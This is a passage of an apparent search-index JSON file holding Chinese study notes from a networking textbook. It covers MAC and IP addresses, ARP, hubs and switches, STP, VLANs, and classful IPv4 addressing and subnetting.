</ul>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p33-37-mac","title":"P33 3.7 MAC\u5730\u5740","text":"<p>\u4f7f\u7528\u70b9\u5bf9\u70b9\u4fe1\u9053\u7684\u6570\u636e\u94fe\u8def\u5c42\uff0c\u4e0d\u9700\u8981\u4f7f\u7528\u5730\u5740</p> <p>\u4f7f\u7528\u5e7f\u64ad\u4fe1\u9053\u7684\u6570\u636e\u94fe\u8def\u5c42\uff0c\u9700\u8981\u4f7f\u7528\u5730\u5740\uff08MAC\u5730\u5740\uff09\uff0c\u6765\u533a\u5206\u5404\u4e3b\u673a\u3002\u6bcf\u4e2a\u4e3b\u673a\u53d1\u9001\u7684\u5e27\u4e2d\uff0c\u9700\u8981\u643a\u5e26\u53d1\u9001\u4e3b\u673a\u548c\u63a5\u6536\u4e3b\u673a\u7684\u5730\u5740\u3002\u8fd9\u4e2a\u5730\u5740\u88ab\u56fa\u5b9a\u5728\u7f51\u5361\u4e2d\uff0c\u662f\u56fa\u5b9a\u53ea\u8bfb\u7684\uff0c\u6240\u4ee5\u4e5f\u6210\u4e3a\u786c\u4ef6\u5730\u5740\u6216\u8005\u7269\u7406\u5730\u5740\u3002\u2014\u2014\u548c\u7269\u7406\u5c42\u65e0\u5173</p> <p>\u4f8b\u5982 TP-LINK \u7f51\u5361\u4e2d\uff0c\u4f7f\u7528 EEPROM \u82af\u7247\u5b58\u50a8MAC\u5730\u5740\uff0c\u4f7f\u7528REALTEK \u82af\u7247\u5b9e\u73b0\u4ee5\u592a\u7f51\u7684\u6570\u636e\u94fe\u8def\u5c42\u548c\u7269\u7406\u5c42\u3002</p> <p>MAC \u5730\u5740\u662f\u7f51\u7edc\u4e2d\u6bcf\u4e00\u4e2a\u63a5\u53e3\u7684\u552f\u4e00\u6807\u8bc6\uff0c\u5e76\u4e0d\u662f\u6bcf\u4e00\u4e2a\u8bbe\u5907\u7684\u6807\u8bc6\uff08\u4ea4\u6362\u673a\u548c\u8def\u7531\u5668\u53ef\u80fd\u6709\u591a\u4e2a\u63a5\u53e3\uff0c\u62e5\u6709\u591a\u4e2aMAC\u5730\u5740\uff09</p> <p>\u683c\u5f0f\uff1a\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u7684\u7f51\u5361\u4e0d\u4e00\u6837\uff08Windows\uff0cAndroid\uff0cMacOS\uff09</p> <p>\u5b58\u5728\u7684\u95ee\u9898\uff1a\u56fa\u5b9a\u7684MAC\u5730\u5740\u53ef\u80fd\u4f1a\u9020\u6210\u4fe1\u606f\u76d1\u542c\uff08\u4e2d\u60c5\u5c40\u901a\u8fc7MAC\u5730\u5740\u5b9a\u4f4d\u7528\u6237\u5e76\u76d1\u89c6\uff09\u73b0\u5728\u6709\u52a8\u6001MAC\u5730\u5740\uff0c\u9632\u6b62\u5b9a\u4f4d\u7b49\u95ee\u9898\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p34-37-ip","title":"P34 3.7 IP\u5730\u5740","text":"<p>\u5305\u62ec\u7f51\u7edc\u7f16\u53f7\u548c\u4e3b\u673a\u7f16\u53f7\uff08\u901a\u8fc7\u5b50\u7f51\u63a9\u7801\u6807\u8bc6\uff09\u7f51\u7edc\u7f16\u53f7\u7528\u6765\u6807\u8bc6\u56e0\u7279\u7f51\u4e0a\u7684\u7f51\u7edc\uff0c\u4e3b\u673a\u7f16\u53f7\u7528\u6765\u5904\u7406\u540c\u4e00\u7f51\u7edc\u7684\u4e0d\u540c\u4e3b\u673a\uff08\u6216\u8005\u8def\u7531\u5668\uff09</p> <p>\u7b80\u4ecb\uff1a\u6570\u636e\u5305\u8f6c\u53d1\u8fc7\u7a0b\u4e2d\uff0cIP \u5730\u5740\u59cb\u7ec8\u4e0d\u53d8\uff0cMAC \u5730\u5740\u4f1a\u4e0d\u65ad\u53d8\u5316\u3002IP \u5730\u5740\u8868\u793a\u63a5\u6536\u65b9\u7684\u5730\u5740\uff0cMAC \u5730\u5740\u8868\u793a\u4e0b\u4e00\u4e2a\u8282\u70b9\u7684\u5730\u5740\u3002\u5728\u7f51\u7edc\u5c42\u4f20\u8f93\u8fc7\u7a0b\u4e2d\uff0c\u8def\u7531\u5668\u7b49\u5904\u7406\u7f51\u7edc\u5c42\u7684 IP \u6570\u636e\u62a5\u8f6c\u53d1\uff0cMAC\u5730\u5740\u5bfb\u627e\u7b49\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p35-37-arp","title":"P35 3.7 ARP\u534f\u8bae","text":"<p>ARP \u5730\u5740\u89e3\u6790\u534f\u8bae\uff1a\u901a\u8fc7IP\u5730\u5740\u83b7\u53d6MAC\u5730\u5740</p> <p>\u5728\u4e00\u4e2a\u5b50\u7f51\u4e2d\uff0c\u6bcf\u4e00\u4e2a\u4e3b\u673a\u6709\u4e00\u4e2a IP-MAC\u5730\u5740\u7684\u5b57\u5178\u7f13\u5b58\u8868\u3002\u53d1\u9001\u5e27\u65f6\u4f1a\u67e5\u8868\u53d1\u9001\u3002\u4e5f\u4f1a\u5728\u5b50\u7f51\u4e2d\uff0c\u5e7f\u64ad\u81ea\u5df1\u7684IP\u5730\u5740\u548cMAC\u5730\u5740\u3002</p> <p>\u56e0\u4e3aIP\u5730\u5740\u548cMAC\u5730\u5740\u5e76\u4e0d\u662f\u56fa\u5b9a\u5bf9\u5e94\u7684\uff0c\u6240\u4ee5\u9700\u8981\u52a8\u6001\u83b7\u53d6\uff08\u9ed8\u8ba4\u4e24\u5206\u949f\uff09</p> <p>ARP \u534f\u8bae\u53ea\u80fd\u5728\u4e00\u6bb5\u94fe\u8def\u6216\u8005\u4e00\u4e2a\u7f51\u7edc\u4e2d\u4f7f\u7528</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p36-38","title":"P36 3.8 \u96c6\u7ebf\u5668\u4e0e\u4ea4\u6362\u673a\u7684\u533a\u522b","text":"<p>HUB \u548c Switch</p> <p>1\u3001\u603b\u7ebf\u578b\u4ee5\u592a\u7f51\uff08\u603b\u7ebf+\u540c\u8f74\u7535\u7f06\uff0c\u5df2\u7ecf\u6dd8\u6c70\uff09</p> <p>2\u3001\u661f\u578b\u4ee5\u592a\u7f51\uff08\u591a\u4e2a\u4e3b\u673a\u4f7f\u7528\u53cc\u7ede\u7ebf+\u96c6\u7ebf\u5668\u8fde\u63a5\uff0c\u5df2\u7ecf\u6dd8\u6c70\uff09\u5728\u903b\u8f91\u4e0a\u548c\u603b\u7ebf\u76f8\u540c\uff0c\u5404\u4e3b\u673a\u5171\u4eab\u4f7f\u7528\u603b\u7ebf\uff0c\u4f7f\u7528CSMA-CD \u534f\u8bae\u3002\u96c6\u7ebf\u5668\u53ea\u5de5\u4f5c\u5728\u7269\u7406\u5c42\uff0c\u4ec5\u8f6c\u53d1\u6bd4\u7279\uff0c\u4e0d\u8fdb\u884c\u78b0\u649e\u68c0\u6d4b\u3002\u2014\u2014\u96c6\u7ebf\u5668\u53ef\u4ee5\u770b\u505a\u603b\u7ebf\u3002\u96c6\u7ebf\u5668\u6709\u5c11\u91cf\u5bb9\u9519\u80fd\u529b\u548c\u7ba1\u7406\u80fd\u529b\uff08\u4e00\u4e2a\u4e3b\u673a\u7684\u7f51\u5361\u51fa\u73b0\u6545\u969c\uff0c\u4e0d\u65ad\u53d1\u9001\u5e27\uff0c\u96c6\u7ebf\u5668\u68c0\u6d4b\u5230\uff0c\u53ef\u4ee5\u81ea\u52a8\u65ad\u5f00\u8fd9\u4e2a\u8fde\u7ebf\uff0c\u4e0d\u4f1a\u5f71\u54cd\u6574\u4e2a\u4ee5\u592a\u7f51\uff09</p> <p>3\u3001\u4ea4\u6362\u673a\uff1a\u5f53\u89c4\u6a21\u8f83\u5927\u65f6\uff0c\u78b0\u649e\u589e\u52a0\uff0c\u4f7f\u7528\u4ea4\u6362\u673a\u53ef\u907f\u514d\uff08\u5ffd\u7565ARP\u8fc7\u7a0b\uff09\u4ea4\u6362\u673a\u6709\u591a\u4e2a\u63a5\u53e3\uff0c\u6bcf\u4e2a\u63a5\u53e3\u8fde\u63a5\u4e3b\u673a\u6216\u8005\u53e6\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u5168\u53cc\u5de5\u65b9\u5f0f\u3002\u5de5\u4f5c\u5728\u7269\u7406\u5c42\u548c\u6570\u636e\u94fe\u8def\u5c42\uff0c\u6536\u5230\u5e27\u540e\uff0c\u5728\u4ea4\u6362\u8868\u4e2d\uff0c\u67e5\u627e\u5230\u76ee\u7684MAC\u5730\u5740\u5bf9\u5e94\u7684\u63a5\u53e3\u53f7\uff0c\u7136\u540e\u8fdb\u884c\u8f6c\u53d1\u3002</p> <p>\u4ea4\u6362\u673a\u53ef\u4ee5\u5b9e\u73b0\u5b58\u50a8\u8f6c\u53d1\uff08\u5148\u68c0\u67e5\u9519\u8bef\u5e76\u7f13\u5b58\u5230\u4ea4\u6362\u673a\uff09\u548c\u76f4\u63a5\u8f6c\u53d1\uff08\u4e0d\u4f1a\u68c0\u67e5\u9519\u8bef\uff0c\u76f4\u63a5\u8f6c\u53d1\uff09</p> <p>\u5bf9\u4e8e\u5e7f\u64ad\u57df\u7684\u60c5\u51b5\uff0c\u96c6\u7ebf\u5668\u548c\u4ea4\u6362\u673a\u90fd\u53ef\u4ee5\u6269\u5927\u5e7f\u64ad\u57df\u3002\u96c6\u7ebf\u5668\u540c\u65f6\u6269\u5927\u4e86\u51b2\u7a81\u57df\uff0c\u4ea4\u6362\u673a\u4e0d\u4f1a\u6269\u5927\u51b2\u7a81\u57df\uff08\u9694\u79bb\u78b0\u649e\u57df\uff09\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p37-39","title":"P37 3.9 \u4ea4\u6362\u673a\u81ea\u5b66\u4e60\u548c\u8f6c\u53d1\u5e27\u7684\u6d41\u7a0b","text":"<p>\u4ea4\u6362\u673a\u521a\u542f\u52a8\u65f6\uff0c\u5e27\u4ea4\u6362\u8868\u662f\u7a7a\u7684\uff0c\u968f\u7740\u5404\u4e3b\u673a\u7684\u901a\u4fe1\uff0c\u901a\u8fc7\u81ea\u5b66\u4e60\u7b97\u6cd5\uff0c\u81ea\u52a8\u5efa\u7acb\u8d77\u5e27\u4ea4\u6362\u8868\u3002</p> <p>\u672a\u5efa\u7acb\u5e27\u4ea4\u6362\u8868\u524d\uff0c\u5728\u4ea4\u6362\u673a\u5185\u90e8\u5b9e\u73b0\u6d2a\u6cdb\u8f6c\u53d1\uff1b\u9010\u6b65\u5efa\u7acb\u8d77\u4ea4\u6362\u8868\u540e\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u76f4\u63a5\u8f6c\u53d1\u3002\u5982\u679c\u4ea4\u6362\u673a\u77e5\u9053\u5e27\u6709\u9519\u8bef\uff0c\u5c31\u5c06\u5176\u4e22\u5f03\u3002</p> <p>\u6bcf\u4e00\u4e2a\u5bf9\u5e94\u5173\u7cfb\u90fd\u6709\u6709\u6548\u65f6\u95f4\uff0c\u5230\u671f\u540e\u81ea\u52a8\u5220\u9664\uff08MAC\u5730\u5740\u548c\u4ea4\u6362\u673a\u63a5\u53e3\u7684\u5bf9\u5e94\u5173\u7cfb\u4e0d\u662f\u6c38\u4e45\u6027\u7684\uff09\uff0c\u53ef\u80fd\u4ea4\u6362\u673a\u7684\u63a5\u53e3\u6539\u63a5\u4e86\u53e6\u4e00\u4e2a\u4e3b\u673a\uff0c\u6216\u8005\u4e3b\u673a\u66f4\u6362\u4e86\u7f51\u5361\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p38-310-stp","title":"P38 3.10 \u4ee5\u592a\u7f51\u4ea4\u6362\u673a\u7684\u751f\u6210\u6811\u534f\u8baeSTP","text":"<p>\u5728\u7f51\u7edc\u4e2d\uff0c\u4e3a\u4e86\u907f\u514d\u67d0\u4e2a\u7f51\u7edc\u6545\u969c\uff0c\u9020\u6210\u6574\u4f53\u7f51\u7edc\u6545\u969c\uff0c\u901a\u5e38\u8981\u8bbe\u7f6e\u5197\u4f59\u94fe\u8def\uff0c\u63d0\u9ad8\u4ee5\u592a\u7f51\u7684\u53ef\u9760\u6027\u3002</p> <p>\u5197\u4f59\u7684\u7ebf\u8def\u4f1a\u5f62\u6210\u591a\u6761\u8fde\u63a5\uff0c\u5f62\u6210\u7f51\u7edc\u73af\u8def\uff0c\u53ef\u80fd\u5e26\u6765\u5e7f\u64ad\u98ce\u66b4\uff08\u6d88\u8017\u7f51\u7edc\u8d44\u6e90\uff09\u4e3b\u673a\u6536\u5230\u91cd\u590d\u7684\u5e27\uff08\u6d88\u8017\u4e3b\u673a\u7684\u8d44\u6e90\uff09\u4ea4\u6362\u673a\u7684\u5e27\u4ea4\u6362\u8868\u9707\u8361\u3002</p> <p>\u4f7f\u7528STP\u534f\u8bae\uff08\u751f\u6210\u6811\u534f\u8bae\uff09\uff0c\u53ef\u4ee5\u589e\u52a0\u5197\u4f59\uff0c\u63d0\u9ad8\u7f51\u7edc\u53ef\u9760\u6027\uff0c\u53c8\u53ef\u4ee5\u907f\u514d\u7f51\u7edc\u73af\u8def\u7684\u5404\u79cd\u95ee\u9898\u3002</p> <ul> <li>\u4e0d\u7ba1\u4ea4\u6362\u673a\u5b9e\u9645\u91c7\u7528\u600e\u4e48\u7269\u7406\u8fde\u63a5\uff0c\u903b\u8f91\u4e0a\uff0c\u4ea4\u6362\u673a\u4f1a\u81ea\u52a8\u8ba1\u7b97\u5e76\u6784\u5efa\u4e00\u4e2a\u6ca1\u6709\u73af\u8def\u7684\u7f51\u7edc\uff08\u6811\u5f62\u7f51\u7edc\uff09\uff0c\u7269\u7406\u4e0a\u7684\u5197\u4f59\u4e0d\u4f1a\u901a\u4fe1\u3002</li> <li>\u8fd9\u4e2a\u751f\u6210\u6811\u62d3\u6251\u53ef\u4ee5\u8fde\u901a\u6574\u4e2a\u7f51\u7edc</li> <li>\u5982\u679c\u9996\u6b21\u8fde\u63a5\u4ea4\u6362\u673a\uff0c\u6216\u8005\u7f51\u7edc\u53d8\u5316\uff08\u6545\u969c\uff09\uff0c\u4ea4\u6362\u673a\u53ef\u4ee5\u91cd\u65b0\u8ba1\u7b97\u751f\u6210\u6811</li> </ul> <p>STP \u7684\u7b97\u6cd5\u4e0d\u5c5e\u4e8e\u8bfe\u7a0b\u57fa\u672c\u5185\u5bb9</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p39-3111-vlan","title":"P39 3.11.1 \u865a\u62df\u5c40\u57df\u7f51VLAN\u6982\u8ff0","text":"<p>\u4f7f\u7528\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u4ea4\u6362\u673a\uff0c\u6784\u5efa\u7684\u4ea4\u6362\u5f0f\u4ee5\u592a\u7f51\uff0c\u6240\u6709\u7ad9\u70b9\u662f\u4e00\u4e2a\u5e7f\u64ad\u57df\u3002\u53ef\u80fd\u5e26\u6765\uff1a\u5e7f\u64ad\u98ce\u66b4\uff1b\u7ba1\u7406\u56f0\u96be\uff1b\u5b89\u5168\u95ee\u9898\u7b49\u3002</p> <p>TCP/IP \u4e2d\u5f88\u591a\u534f\u8bae\u4f1a\u4f7f\u7528\u5e7f\u64ad\uff08ARP\uff0cRIP\uff0cDHCP\uff09\uff0c\u6240\u4ee5\u9700\u8981\u5904\u7406\u5e7f\u64ad\u95ee\u9898</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u8def\u7531\u5668\u53ef\u4ee5\u5206\u5272\u5e7f\u64ad\u57df</p> <p>\u865a\u62df\u5c40\u57df\u7f51\uff1a\u5c06\u7269\u7406\u5c42\u5c5e\u4e8e\u4e00\u4e2a\u5c40\u57df\u7f51\u7684\u8bbe\u5907\uff0c\u5728\u903b\u8f91\u4e0a\u5212\u5206\u6210\u4e0d\u540c\u7684\u5c40\u57df\u7f51\uff08\u903b\u8f91\u7ec4\u6709\u67d0\u4e9b\u5171\u540c\u7684\u9700\u6c42\u7b49\uff09\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u865a\u62df\u5c40\u57df\u7f51\u4e2d\u5e7f\u64ad\u4fe1\u53f7</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p40-3112-vlan","title":"P40 3.11.2 \u865a\u62df\u5c40\u57df\u7f51VLAN\u7684\u5b9e\u73b0\u673a\u5236","text":"<p>\u4f7f\u7528 802.1Q\u5e27\u5b9e\u73b0\uff0c\u5728 MAC \u5e27\u7684\u57fa\u7840\u4e0a\uff0c\u589e\u52a0\u4e86 VLAN \u6807\u8bb0\u5b57\u6bb5\uff08\u6807\u8bb0\u4e86\u4ee5\u592a\u7f51\u5e27\u5c5e\u4e8e\u54ea\u4e00\u4e2aVLAN\uff0c\u53d6\u503c\u662f1~4094\uff09</p> <p>802.1Q\u5e27\u65f6\u4ea4\u6362\u673a\u5904\u7406\u7684\uff0c\u4e0d\u662f\u7528\u6237\u4e3b\u673a\u5904\u7406\u7684\u3002</p> <p>\u4ea4\u6362\u673a\u6536\u5230\u666e\u901a\u7684\u4ee5\u592a\u7f51\u5e27\u540e\uff0c\u4f1a\u63d2\u5165VLAN\u6807\u8bb0\u8f6c\u6362\u6210 802.1Q\u5e27\uff08\u6253\u6807\u7b7e\uff09\u3002\u4ea4\u6362\u673a\u8f6c\u53d1802.1Q\u5e27\u65f6\uff0c\u53ef\u80fd\u5220\u9664VLAN\u6807\u8bb0\uff0c\u8f6c\u6362\u6210\u666e\u901a\u5e27\uff08\u53bb\u6807\u7b7e\uff09\u3002</p> <p>\u4ea4\u6362\u673a\u7684\u7aef\u53e3\u7c7b\u578b\u4e0d\u540c\uff08\u4e0d\u540c\u4f01\u4e1a\u7aef\u53e3\u4e0d\u540c\uff0c\u534e\u4e3a\u601d\u79d1\uff09\uff08Access\u7aef\u53e3\u7528\u4e8e\u4ea4\u6362\u673a\u548c\u7528\u6237\u4e3b\u673a\u7684\u4e92\u8fde\uff0cTrunk \u7aef\u53e3\uff09\u4ea4\u6362\u673a\u4e4b\u95f4\u7684\u7aef\u53e3\u8bbe\u7f6e\u6210 Trunk \u7c7b\u578b\uff0cHybrid \u7aef\u53e3\u90fd\u53ef\u4ee5\u3002</p> <p>Hybrid \u7aef\u53e3\u5904\u7406\u65b9\u6cd5\uff1a\u5982\u679c\u5e27\u7684VID\u5b58\u5728\u7aef\u53e3\u7684\u53bb\u6807\u7b7e\u5217\u8868\u4e2d\uff0c\u5c31\u53bb\u6807\u7b7e\u540e\u8f6c\u53d1\u3002\u5982\u679c\u4e0d\u5b58\u5728\u5217\u8868\u4e2d\uff0c\u76f4\u63a5\u8f6c\u53d1\u3002</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"04 \u7f51\u7edc\u5c42","text":""},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#_1","title":"\u7b2c\u56db\u7ae0 \u7f51\u7edc\u5c42","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 12419  \u9605\u8bfb25\u5206\u949f</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p41-41","title":"P41 4.1 \u7f51\u7edc\u5c42\u6982\u8ff0","text":"<p>\u7f51\u7edc\u5c42\uff1a\u5b9e\u73b0\u7f51\u7edc\u4e92\u8fde\uff0c\u5b9e\u73b0\u6570\u636e\u5305\u5728\u5404\u4e2a\u7f51\u7edc\u4e4b\u95f4\u7684\u4f20\u8f93</p> <p>\u89e3\u51b3\u95ee\u9898\uff1a\u5411\u8fd0\u8f93\u5c42\u63d0\u4f9b\u4ec0\u4e48\u670d\u52a1\uff1b\u7f51\u7edc\u5c42\u5bfb\u5740\uff1b\u8def\u7531\u9009\u62e9\uff08\u7f51\u7edc\u62d3\u6251\u7ecf\u5e38\u6539\u53d8\u7684\u5927\u578b\u4e92\u8054\u7f51\uff0c\u8def\u7531\u8868\u4e0d\u9002\u7528\uff09</p> <p>\u56e0\u7279\u7f51\u4f7f\u7528 TCP/IP \u534f\u8bae\uff0c\u7f51\u7edc\u5c42\u4e5f\u79f0\u4e3a\u7f51\u9645\u5c42</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p42-42","title":"P42 4.2 \u7f51\u7edc\u5c42\u63d0\u4f9b\u7684\u4e24\u79cd\u670d\u52a1","text":"<p>\u9762\u5411\u8fde\u63a5\u7684\u865a\u7535\u8def\u670d\u52a1\uff1a\u7f51\u7edc\u5c42\u5efa\u7acb\u865a\u7535\u8def\u8fde\u63a5\uff0c\u901a\u4fe1\u53cc\u65b9\u6cbf\u7740\u865a\u7535\u8def\u53d1\u9001\u5206\u7ec4\uff1b\u901a\u4fe1\u7ed3\u675f\u540e\u9700\u8981\u91ca\u653e\u865a\u7535\u8def\u3002\u4e92\u8054\u7f51\u6ca1\u6709\u4f7f\u7528\u8fd9\u4e2a\u601d\u8def\u3002</p> <p>\u65e0\u8fde\u63a5\u7684\u6570\u636e\u62a5\u670d\u52a1\uff1a\u53ef\u9760\u901a\u4fe1\u7531\u4e3b\u673a\u4fdd\u8bc1\uff0c\u4e0d\u9700\u8981\u5efa\u7acb\u7f51\u7edc\u5c42\u8fde\u63a5\uff0c\u6bcf\u4e2a\u5206\u7ec4\u8d70\u4e0d\u540c\u7684\u8def\u5f84\uff1b\u6bcf\u4e2a\u5206\u7ec4\u9996\u90e8\u643a\u5e26\u76ee\u7684\u4e3b\u673a\u7684\u5b8c\u6574\u5730\u5740\u3002\u901a\u4fe1\u7684\u5206\u7ec4\u53ef\u80fd\u8bef\u7801\uff0c\u4e22\u5931\uff0c\u91cd\u4f20\uff0c\u5931\u5e8f\u7b49\u3002\u7f51\u7edc\u4e0d\u63d0\u4f9b\u7aef\u5230\u7aef\u7684\u53ef\u9760\u4f20\u8f93\u670d\u52a1\uff0c\u8def\u7531\u5668\u6bd4\u8f83\u7b80\u5355\uff0c\u4ef7\u683c\u4f4e\u3002</p> <p>\u8fd9\u6837\uff0c\u5c06\u590d\u6742\u7684\u7f51\u7edc\u5904\u7406\u529f\u80fd\u653e\u5728\u4e92\u8054\u7f51\u8fb9\u7f18\uff08\u4e3b\u673a\u5185\u90e8\u7684\u8fd0\u8f93\u5c42\uff09\uff0c\u56e0\u7279\u7f51\u6838\u5fc3\u5c3d\u6700\u5927\u52aa\u529b\u5206\u7ec4\u4ea4\u4ed8\u3002</p> <p>\u540e\u6587\u5185\u5bb9\uff1a\u7f51\u7edc\u5c42\u5982\u4f55\u4f20\u8f93 IP \u6570\u636e\u62a5</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p43-431-ipv4","title":"P43 4.3.1 IPv4\u5730\u5740\u6982\u8ff0","text":"<p>IPV4\u662f\u56e0\u7279\u7f51\u6bcf\u4e00\u53f0\u4e3b\u673a\uff08\u8def\u7531\u5668\uff09\u7684\u6bcf\u4e00\u4e2a\u63a5\u53e3\uff0c\u5206\u914d\u4e00\u4e2a\u5728\u4e16\u754c\u8303\u56f4\u5185\u552f\u4e00\u768432\u4f4d\u6bd4\u7279\u7684\u6807\u8bc6\u7b26\uff08\u901a\u5e38\u4f7f\u7528\u5341\u8fdb\u5236\u8868\u793a\u65b9\u6cd5\u4f7f\u7528\uff09\u30022011\u5e74\u5df2\u7ecf\u5206\u914d\u5b8c\u6bd5\uff0c\u65b0\u7684 IPV6 \u6b63\u5728\u90e8\u7f72\u3002</p> <p>IPV4\u7ecf\u8fc7\u4e09\u4e2a\u9636\u6bb5\uff1a\u5206\u7c7b\u7f16\u5740\uff1b\u5212\u5206\u5b50\u7f51\uff1b\u65e0\u5206\u7c7b\u7f16\u5740</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p44-432-ipv4","title":"P44 4.3.2 \u5206\u7c7b\u7f16\u5740\u7684IPv4\u5730\u5740","text":"<p>IPV4\u5206\u6210\uff1aABCDE\u7c7b\u5730\u5740\u3002</p> <p>A \u524d8\u4f4d\u662f\u7f51\u7edc\u53f7\uff0c\u540e24\u4f4d\u662f\u4e3b\u673a\u53f7\uff08\u7f51\u7edc\u53f7\u5c0f\u4e8e127\uff09</p> <p>B \u524d16\u4f4d\u662f\u7f51\u7edc\u53f7\uff0c\u540e16\u4f4d\u662f\u4e3b\u673a\u53f7\uff08\u7f51\u7edc\u53f7128-191\uff09</p> <p>C \u524d24\u4f4d\u662f\u7f51\u7edc\u53f7\uff0c\u540e8\u4f4d\u662f\u4e3b\u673a\u53f7\uff08\u7f51\u7edc\u53f7192-223\uff09</p> <p>D \u591a\u64ad\u5730\u5740\uff081110\uff09</p> <p>E \u4fdd\u7559</p> <p>ABC\u4e09\u7c7b\u5730\u5740\u53ef\u4ee5\u5206\u914d\uff1b\u5168\u90e8\u662f0\u7684\u662f\u7f51\u7edc\u5730\u5740\uff0c\u5168\u90e8\u662f1\u7684\u662f\u5e7f\u64ad\u5730\u5740\uff0c\u8fd9\u4e24\u4e2a\u4e0d\u80fd\u5206\u914d\u7ed9\u4e3b\u673a\u6216\u8005\u8def\u7531\u5668\u7684\u63a5\u53e3</p> <p>A\u7c7b\u5730\u5740\uff1a\u7b2c\u4e00\u4e2a\u53ef\u6307\u6d3e\u7684\u7f51\u7edc\u53f7\u65f61\uff0c\u7f51\u7edc\u5730\u5740\u662f 1.0.0.0\u3002\u6700\u5927\u7f51\u7edc\u53f7\u662f 127\uff0c\u4f5c\u4e3a\u672c\u5730\u73af\u56de\u6d4b\u8bd5\u5730\u5740\uff0c\u4e0d\u6307\u6d3e\u3002\u672c\u5730\u73af\u56de\u6d4b\u8bd5\u5730\u5740\uff1a127.0.0.1 \u5230 127.255.255.254\u3002</p> <p>B\u7c7b\u5730\u5740\uff1a\u7b2c\u4e00\u4e2a\u7f51\u7edc\u53f7\u662f 128.0 \u7f51\u7edc\u5730\u5740\u662f 128.0.0.0 \u6700\u540e\u4e00\u4e2a\u662f 191.255 \u7f51\u7edc\u5730\u5740\u662f 191.255.0.0 \u6bcf\u4e2a\u7f51\u7edc\u4e2d\u53ef\u5206\u914d\u7684IP\u5730\u5740\u6570\u91cf\u53ef\u4ee5\u7b97\u51fa</p> <p>C\u7c7b\u5730\u5740\uff1a\u7b2c\u4e00\u4e2a\u7f51\u7edc\u53f7 192.0.0 \u7f51\u7edc\u5730\u5740\u662f 192.0.0.0 \u6700\u5927\u7f51\u7edc\u53f7\u662f 223.255\u3002255 \u7f51\u7edc\u5730\u5740\u662f 233.255.255.0</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p45-433-ipv4","title":"P45 4.3.3 \u5212\u5206\u5b50\u7f51\u7684IPv4\u5730\u5740","text":"<p>\u5982\u679c\u65b0\u589e\u4e00\u4e2a\u5b50\u7f51\uff0c\u91cd\u65b0\u7533\u8bf7\u65b0\u7684\u7f51\u7edc\u53f7\uff0c\u90a3\u4e48\u9700\u8981\u65f6\u95f4\u91d1\u94b1\u6210\u672c\uff0c\u6d6a\u8d39\u539f\u6709\u7f51\u7edc\u4e2d\u5269\u4f59\u7684IP\u5730\u5740\uff0c\u4f1a\u589e\u52a0\u5176\u4ed6\u8def\u7531\u8868\u8bb0\u5f55\u7684\u6570\u91cf\u3002</p> <p>\u6240\u4ee5\uff0c\u4f7f\u7528\u5b50\u7f51\u63a9\u7801\uff0c\u4eceIP\u5730\u5740\u4e2d\u7684\u4e3b\u673a\u53f7\u90e8\u5206\uff0c\u501f\u7528\u4e86\u51e0\u4e2a\u6bd4\u7279\u4f5c\u4e3a\u5b50\u7f51\u53f7\u3002</p> <p>\u5b50\u7f51\u63a9\u7801\uff1a\u4f7f\u7528\u8fde\u7eed\u76840\u8868\u793a\u4e3b\u673a\u53f7\uff0c\u4f7f\u7528\u8fde\u7eed\u76841\u8868\u793a\u7f51\u7edc\u53f7\u548c\u5b50\u7f51\u53f7\u3002\u5c06 IP \u5730\u5740\u548c\u5b50\u7f51\u63a9\u7801\u4e0e\u8fd0\u7b97\uff0c\u53ef\u4ee5\u83b7\u53d6\u6240\u5728\u5b50\u7f51\u7684\u7f51\u7edc\u5730\u5740\u3002</p> <p>\u4f8b\u5982\uff1a\u7f51\u7edc\u53f7\u662f 218\u300275.230.0\uff0c\u5b50\u7f51\u63a9\u7801 255.255.255.128 \uff0c\u5c5e\u4e8eC\u7c7b\u5730\u5740\uff0c\u524d24\u4f4d\u662f\u7f51\u7edc\u53f7\uff0c\u540e\u97628\u4f4d\u662f\u4e3b\u673a\u53f7\u3002\u7136\u540e\u5b50\u7f51\u63a9\u7801 128 